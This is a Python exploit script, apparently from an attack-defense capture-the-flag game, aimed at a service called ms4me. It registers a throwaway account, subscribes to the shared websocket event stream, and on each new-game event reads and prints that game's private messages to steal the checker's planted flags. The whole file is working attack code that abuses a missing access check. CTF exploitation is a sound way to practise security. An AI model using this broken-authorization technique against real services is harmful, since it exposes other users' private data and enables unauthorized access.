import ms4me_api
from requests import Session
from utils import generate_random_string
from models import *
import json
import sys
import websocket
import time


PORT = 15050


def sploit(host: str):
    client = ms4me_api.Client(Session(), host)
    username, password = generate_random_string(12), generate_random_string(12)
    client.register(username, password)
    client.login(username, password)
    
    def on_message(ws: websocket.WebSocketApp, message: str):
        if message == "ping":
            return
        event = Event(**json.loads(message))
        if event.event_type == EventType.TYPE_CREATE_GAME:
            time.sleep(1) # Ждём, пока чекер положит флаг
            if event.payload == None:
                raise Exception("empty payload in update event")
            id = event.payload["id"]
            messages = client.read_messages(id)
            for message in messages:
                print(message.text, flush=True)
    
    ws = client.run_common_ws_conn(on_message)
    ws.run_forever()

if __name__ == "__main__":
    sploit(sys.argv[1])